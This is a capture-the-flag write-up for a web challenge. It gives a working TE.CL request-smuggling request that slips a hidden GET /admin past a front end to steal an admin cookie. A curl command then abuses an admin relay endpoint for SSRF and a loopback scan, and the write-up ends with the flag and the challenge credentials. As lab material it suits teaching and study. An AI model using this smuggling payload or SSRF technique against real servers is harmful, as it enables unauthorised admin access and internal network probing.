# Revenge Of SeaSide - Full Step-by-Step Writeup

- Provided creds from PDF:
  - Username: `AlexGoodwin`
  - Password: `Pine123`

---

Old path confusion variants (like `//localhost/admin`) are also blocked in this revenge instance.

## Clue interpretation (why smuggling)

Two important hints from app content:

- Gateway log:
  - "Forwarding path now strips duplicate transfer directives..."
  - "Do not split maintenance sequences across separate channels."
- Comms feed:
  - "I sent the two pieces..."
  - "it only works when it stays on the same line."

This points to parser/channel disagreement and two-piece single-line delivery: classic **request smuggling** clueing.

---

## Validate desync behavior

When sending both `Content-Length` and `Transfer-Encoding: chunked`, behavior changes vs normal requests.  
This indicates front-end/back-end parsing mismatch.

The successful path here is **TE.CL**:

- Front-end honors chunked framing.
- Back-end honors Content-Length.

---

## Smuggle backend `GET /admin` and steal `relay_auth`

Use a raw socket request.  
Key trick: place `GET /admin ...` as chunk data and set `Content-Length` small so backend desyncs and parses hidden request.

> Just to be Clear we use Brup Suite to get the flag for the writeup we simulate on the curl

### Working raw request structure

```http
POST /forum/post HTTP/1.1
Host: 194.102.62.166:24956
Cookie: session=<SESSION>
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

33
GET /admin HTTP/1.1
Host: 194.102.62.166:24956


0

GET /forum HTTP/1.1
Host: 194.102.62.166:24956
Cookie: session=<SESSION>
Connection: close
```

Observed response included:

- First response: `302` from `/forum/post`
- Second smuggled response: `200 OK` from `/admin`
- Header:
  - `Set-Cookie: relay_auth=<value>; Path=/admin; HttpOnly; SameSite=Lax`

That `relay_auth` is what we need.

---

## Access admin and SSRF endpoint

After setting both cookies:

- `session=<...>`
- `relay_auth=<...>` (Path `/admin`)

`GET /admin` returns admin panel and inventory probe UI.  
`POST /admin/relay` accepts:

- form field: `inventory_node`

Example:

```bash
curl -s -b ctf_cookie_24956.txt -X POST "http://194.102.62.166:24956/admin/relay" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "inventory_node=http://127.0.0.21:9100/inventory/stock/check?HarborId=1"
```

Expected: `Status: 200` and inventory JSON.

---

## Scan loopback SSRF range

Scan `127.0.0.1` to `127.0.0.254` on port `9100` through `/admin/relay`.

Live nodes found:

- `127.0.0.21`
- `127.0.0.241`

---

## Enumerate hidden node and get flag

Known path still works, but node changed vs older instance.

Final path:

- `http://127.0.0.241:9100/drops/pacific/batch-44c/vault/sealed/flag`

Response contains:

## Final Flag

`UVT{N0w_Y0u_R34lLy_Pr0v3d_y0ur53lf_MrP1n3}`

---
